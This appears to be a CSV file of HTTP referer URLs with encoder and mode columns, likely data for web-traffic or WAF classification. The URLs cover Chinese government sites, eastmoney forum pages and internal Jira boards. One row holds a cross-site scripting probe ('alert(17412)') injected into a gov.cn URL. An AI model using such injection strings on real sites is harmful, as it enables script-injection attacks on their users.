httpReferer,encoder,mode_is
http://gaj.guilin.gov.cn/site/public/techzs.aspx?menuid=400610,291,0
http://gaj.guilin.gov.cn/site/public/techzs.aspx?menuid=400610&%27)};alert(17412)//=2,292,0
http://gb.oversea.cnki.net//KCMS/docdown/pubdownload.aspx?dk=kdoc%3acajdown%3add97542b6cfe67efabfded5a2704e65a,293,0
http://gb.oversea.cnki.net//KCMS/docdown/pubdownload.aspx?dk=kdoc%3apdfdown%3a2dfdb899c2586cd70f2752b1f3637d5d,294,0
http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=CINS201304017&dbcode=CJFD&dbname=CJFD2013&UID=WEEvREcwSlJHSldTTEYzVDhUSFJPcG1FSzJicGNiZm1sVlltOGU2ZlBURT0%3d%249A4hF_YAuvQ5obgVAqNKPCYcEjKensW4IQMovwHtwkF4VYPoHbKxJw!!&autoLogin=0,295,0
http://go.sogou.com/css/api/CaleWeather.css,296,0
http://greatagain.*.com.cn/,297,0
http://gswsdj.zjzwfw.gov.cn/entrance.html,298,0
"http://guba.eastmoney.com/concept/list,300033.html?tabtype=99",299,0
"http://guba.eastmoney.com/list,000063.html",300,0
"http://guba.eastmoney.com/list,000545.html",301,0
"http://guba.eastmoney.com/list,000623.html?from=BaiduAladdin",302,0
"http://guba.eastmoney.com/list,000725.html",303,0
"http://guba.eastmoney.com/list,002503.html",304,0
"http://guba.eastmoney.com/list,300716.html?from=BaiduAladdin",305,0
"http://guba.eastmoney.com/list,600237.html?from=BaiduAladdin",306,0
"http://guba.eastmoney.com/list,601618,1,f.html",307,0
"http://guba.eastmoney.com/list,601618.html?from=BaiduAladdin",308,0
"http://guba.eastmoney.com/list,688023.html?from=BaiduAladdin",309,0
"http://guba.eastmoney.com/list,688023_2.html",310,0
"http://guba.eastmoney.com/list,688090.html",311,0
"http://guba.eastmoney.com/list,688090.html?from=BaiduAladdin",312,0
"http://guba.eastmoney.com/news,000545,903787464.html",313,0
"http://guba.eastmoney.com/news,300620,906171084.html",314,0
"http://guba.eastmoney.com/news,600237,906591061.html",315,0
"http://guba.eastmoney.com/news,688023,884823196.html",316,0
"http://guba.eastmoney.com/news,688023,902906270.html?from=BaiduAladdin",317,0
"http://guba.eastmoney.com/news,688023,904746106.html",318,0
"http://guba.eastmoney.com/news,688023,905739584.html",319,0
"http://guba.eastmoney.com/news,688023,905783139.html",320,0
"http://guba.eastmoney.com/news,688023,906168377.html",321,0
"http://guba.eastmoney.com/news,688023,906339802.html",322,0
"http://guba.eastmoney.com/news,688023,906843961.html",323,0
"http://guba.eastmoney.com/news,cjpl,906572074.html",324,0
"http://guba.eastmoney.com/news,dcblog,834638907.html",325,0
http://guba.eastmoney.com/news_soft.aspx?color=b&code=688023&id=906843961,326,0
http://guba.eastmoney.com/qa/qa_search.aspx?company=300033&keyword=&questioner=&qatype=1,327,0
http://guba.eastmoney.com/qa/search?type=2&code=300033,328,0
http://hanlp.com/,329,0
http://hao.qq.com/?unc=Af31026&s=o400493_1,330,0
http://help.iqiyi.com/questionInfo/3186.html,331,0
http://home.firefoxchina.cn/,332,0
http://hz.zjzwfw.gov.cn/col/col1962/index.html?tabid=45023,333,0
"http://image.baidu.com/search/detail?ct=503316480&z=undefined&tn=baiduimagedetail&ipn=d&word=%E5%A3%81%E7%BA%B8&step_word=&ie=utf-8&in=&cl=&lm=-1&st=undefined&hd=undefined&latest=undefined&copyright=undefined&cs=3730267016,1291960719&os=3279078104,2183212087&simid=3446727280,174503358&pn=121&rn=1&di=20900&ln=3132&fr=&fmq=1582535805214_R&fm=&ic=undefined&s=undefined&se=&sme=&tab=0&width=1920&height=1080&face=undefined&is=0,0&istype=0&ist=&jit=&bdtype=0&spn=0&pi=0&gsm=5a&oriquery=%E5%A3%81%E7%BA%B8&objurl=http%3A%2F%2Fimg.pconline.com.cn%2Fimages%2Fupload%2Fupc%2Ftx%2Fwallpaper%2F1208%2F15%2Fc0%2F12924355_1344999165550.jpg&rpstart=0&rpnum=0&adpicid=0&force=undefined&ctd=1582535841487^3_1519X763%1",334,0
http://image.baidu.com/search/index?tn=baiduimage&ct=201326592&lm=-1&cl=2&ie=gb18030&word=%D7%C0%C3%E6%B1%DA%D6%BD&fr=ala&ala=1&pos=0&alatpl=wallpaper&oriquery=%E6%A1%8C%E9%9D%A2%E5%A3%81%E7%BA%B8,335,0
http://image.baidu.com/search/index?tn=baiduimage&ct=201326592&lm=-1&cl=2&ie=gb18030&word=confluence%D6%D0%D3%D0%D0%F2%C1%D0%B1%ED%BA%F3%B2%E5%C8%EB%CD%BC%C6%AC&fr=ala&ala=2&alatpl=sp&pos=0,336,0
http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=app%E9%95%BF%E8%A1%A8%E5%8D%95,337,0
http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8,338,0
http://info.pinyin.sogou.com/ime_push/getxinci.php?h=D53B43D1F76E2ECF8815D05DB3DCE579&v=9.5.0.3517&r=0000_sogou_pinyin_67d&passport=&ppversion=3.1.0.2216&id=Y10000001&newwordver=1582532700&activeprocess=chrome.exe&configver=604&pageurl=link_index_new.php&adurl=http://info.pinyin.sogou.com/ime_push/sgse_ad/sgse_s_all_new.php,339,0
http://isdp-dg.huawei.com/sdcloud/portal/index.html,340,0
http://iwencai.com/unifiedwap/result?w=%E7%A7%91%E5%88%9B%E6%9D%BF%20%E4%B8%9A%E7%BB%A9%E5%BF%AB%E6%8A%A5&querytype=&issugs,341,0
http://jira.das-security.cn/secure/Dashboard.jspa,342,0
http://jira.info.*.com.cn/browse/APT-865,343,0
http://jira.info.*.com.cn/browse/APT-876,344,0
http://jira.info.*.com.cn/browse/APT-879?filter=-2,345,0
http://jira.info.*.com.cn/browse/UT-245,346,0
http://jira.info.*.com.cn/browse/UT-259,347,0
http://jira.info.*.com.cn/browse/UT-263,348,0
http://jira.info.*.com.cn/browse/UT-274?filter=-2&jql=reporter%20in%20(currentUser())%20order%20by%20created%20DESC,349,0
http://jira.info.*.com.cn/browse/UT-286,350,0
http://jira.info.*.com.cn/projects/SUMAP/summary,351,0
http://jira.info.*.com.cn/secure/Dashboard.jspa,352,0
http://jira.info.*.com.cn/secure/Dashboard.jspa?selectPageId=10904,353,0
http://jira.ngwdev.com/browse/WAF-365?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,354,0
http://jira.ngwdev.com/browse/WAF-373,355,0
http://jira.ngwdev.com/browse/WAF-391?filter=-2,356,0
http://jira.ngwdev.com/browse/WAF-392?filter=-2,357,0
http://jira.ngwdev.com/browse/WAF-393?filter=-2,358,0
http://jira.ngwdev.com/browse/WAF-405?filter=-2,359,0
http://jira.ngwdev.com/browse/WAF-406?filter=-2,360,0
http://jira.ngwdev.com/browse/WAF-415,361,0
http://jira.ngwdev.com/browse/WAF-418,362,0
http://jira.ngwdev.com/browse/WAF-419,363,0
http://jira.ngwdev.com/browse/WAF-419?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,364,0
http://jira.ngwdev.com/browse/WAF-420,365,0
http://jira.ngwdev.com/browse/WAF-421?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,366,0
http://jira.ngwdev.com/browse/WAF-423,367,0
http://jira.ngwdev.com/browse/WAF-424?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.*,368,0
http://jira.ngwdev.com/browse/WAF-424?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,369,0
http://jira.ngwdev.com/browse/WAF-427,370,0
http://jira.ngwdev.com/browse/WAF-427?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,371,0
http://jira.ngwdev.com/browse/WAF-429?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,372,0
http://jira.ngwdev.com/browse/WAF-430,373,0
http://jira.ngwdev.com/browse/WAF-435,374,0
http://jira.ngwdev.com/browse/WAF-436?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,375,0
http://jira.ngwdev.com/browse/WAF-437?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,376,0
http://jira.ngwdev.com/browse/WAF-437?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,377,0
http://jira.ngwdev.com/browse/WAF-438,378,0
http://jira.ngwdev.com/browse/WAF-439,379,0
http://jira.ngwdev.com/browse/WAF-440,380,0
http://jira.ngwdev.com/browse/WAF-441,381,0
http://jira.ngwdev.com/download/resources/rw-smart-checklist-biz:resources/checklist.html?context=agile_board,382,0
http://jira.ngwdev.com/download/resources/rw-smart-checklist-biz:resources/checklist.html?context=issue_details,383,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.*,384,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,385,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20DESC,386,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13),387,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,388,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20DESC,389,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,390,0
http://jira.ngwdev.com/issues/?jql=project+%3D+WAF+AND+fixVersion+%3D+4.6.*,391,0
http://jira.ngwdev.com/login.jsp?permissionViolation=true&os_destination=%2Fbrowse%2FWAF-438&page_caps=&user_role=,392,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3A%2FXQq6veVsMmYNCtUxD%2BLx8qGt63DUxCFA2eSCpKeEEhDK1x0qZyxm3kUfTaTiwj1CVjsbXOeP5pvNcE1S0CyxtxQOXldoO0Ab5DAaajaunY13%2FGQlb2xubMEUwHjQ98xiqw1AgauPO%2BH7IcLoS0aYNZSSfyhxufBFAp6n8j6u008n2p4Y1hfdUsPmOgGiO%2Bb3H8bnZ0J8ynNOhqO6NA7whu9GOpbi2RpoGWWpy%2BzlYWcuztL1vTygsM%2BT6F8rckNveu2GW%2B85GSb%2Fu8r1SfodlnW%2FLyvt3FMlwId%2FZzN85IZ22AO7sl08yavenQn6IMSblZCuTFSx4igfMa112el7F4PWwg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,393,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3A6ZYQExlhlR2%2BR14Mw3yGaoL0EDmtNhLrrNwigYLzvW4gVAUJZSicE9in1epaLbIJ2E10gJV%2BERGq36vOeQZpteWFxT%2FGMUu3syiOpTYTjaMBLAxNa9b%2F2D0GNUvuDpGm%2F%2BX6TW86Y8Frz93%2BYz7L%2BlCp4zxQxDKKS2lDi5BlJ9dQL3tq7ytoYL00aktihM%2FxnaqsDmAzEC10xv3SfJFa3N1%2F%2FYODMXi2MtSxhqd8yRVCLc7y%2BR%2Fk1rRjrGoXvNwtXHINo1TtJap%2BYnXvOqyhD9C8An6AcN0Cpn%2BOcOpgGuqBkhui6T11aRrCorvnuORl5IXCqTWWxUqOPN0yhTBDRGD%2B3tg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,394,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AZmZUb%2FQLtPoo5rLaIl4C2Vd47Bq%2BszMIRzl5xJJ60UcrZMJSjrNwKn0nb9g0FpwcFK1e5eedt3p7X75WDXB42Sj%2B35i%2BwFMamvsPC%2BClDqyoecpYMNTijdVP8iFQR2jMWj3KlsFK6%2BYtbZ5YM2yqI1HMhWH5WuLJ1UJrX30cQeNvD6GdbcxR4iBCq5khEXTglycibhEsVruU0s2dhRw0O0UAK3fm1ITS79fky3GFC1czvCqeCYPlKF%2FhSKPxjp5fk2TWcbWyJOuW0EyOw700A7rzpdFYU0yWk3O%2Fo91jyFDVujUhGnGonHjqQJZ%2FBwpFezEI11gMJxPGbQdKxn8evfnh7ds%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,395,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AeE26CriyrUr8lylsqCKWbrt%2BaK3QBG8PfxokUgiRJ67SGBW5TdkBijGXRJMBs5R4btmN03qKHYwJqma%2BpPBhskjS3x7j1r8TE02Zt3T%2FPgZZoSEVZfMUA1XBsjZawAoFqqM9WBdT9zc6T%2BzRaXfdQZ1ht0Q2p5fQhECN6lMaVMhRZIBCOOj1%2FisYMOo5m4qbZp6lnkxFum5Ku2sjOiuCENSoU8fWp9DlRMD3TmymzxdrdMIfc7JgSgcq1NeRlpwlzHO%2F0%2FLkTIPAq%2BmG6XLEYryeUwpnFRSpFAi6LQQQGpCJZNKPUqhmJRmgue7rT4qaP%2FGcyiBl9BaeqwH6ZRLkjcqy4H4%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,396,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3Ai3f5FQa9PjN35CjIItlKzshUlwy4JBTvZo25pu1WUWn7PxPZ0%2FgsQQQY6OkFnxIbdy%2F8GGv1%2FAgzNV6mEVl9X4cNZrtk3rSEfoEq0SYBjdGbwrAJx3CcuYSc3zSLQsEKikJ2AngxNEbY23GV4J3gxl5DWpA8NSEtp71D3E7pFuBq6IJQKWOmGLwaKqXC0RNKNnjaxaH5ajdgmrTQSZyFoSQGcfhPzzbAxNJp5cwuLcoROaqY9BKsQnZ8F5fHVkAkudRmEWzh4OlCLMlvhLXDMRqNGdcVJVu%2BPtmsxWLWJJAYIL6z4y%2FAHbyjIr3ep8QvR3DH%2FZkLtnyWYEdfqTjpamJGPAs%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,397,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3An6T119pAvkTIsh50N9qA8YmTwxGs09ca8V8Qm46Cbs43b%2Bx%2F%2FtFsXEH9kVuOa25mvBd%2FfEj%2Ft70zqH810ofH9M56cYAXvZSyxLINtgSJQfLG%2B12nSTUowpeQazF0nSBWGRfb5SmQqGctnYCurNefswFrJexbqT8xIFEhhzRPXYBPKGDedxma5MDyUufheTlUdKDe3r4PfTUGf7GVaBvsUt6mhQ4aXhPTHUtVADmhZQpuhrSdmugOCIuZRehuNYvH%2BujniAol3D7%2FeyQPoRSsNJJ8IpWJ4g768xby8j%2Bf%2BWvtuq8CThuu6gAssyAT8xBfTMoWD%2FeY3851n6GyAgcJ6ATwakQ%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,398,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AsANs3cTcNurkzTGcbx1D7j6czHHdAEjeE8clpSq58qPJbHoMtF0rg7J%2BZ5KwrsAKDhUya6I1bfgPQJ6t%2Fq%2FWQtaq0ExGyrYvySN4ghg7P%2F7BniDq8pvU4NYmvXsJhRZiTs78MDXzeyxGXpYPdYGWmLgI0n4dm4MsH4ei5DVfaPwFKBVv1iKu8o7j35cUEkwBve2ns8PCu17tbKlbVIMXDBmFpmAlMidftM8%2FwzCE8lkCnd1lyBLZAv%2FCLOxdtBuw7MMUnrqLvP8iOIkfdjHba%2BQQ1LdxgnxJEzh4qEXXt4XZeDqqHG93DbO3JkB%2BIQClyku2BHcACRttGFLmNGdK0rUT2yg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,399,0
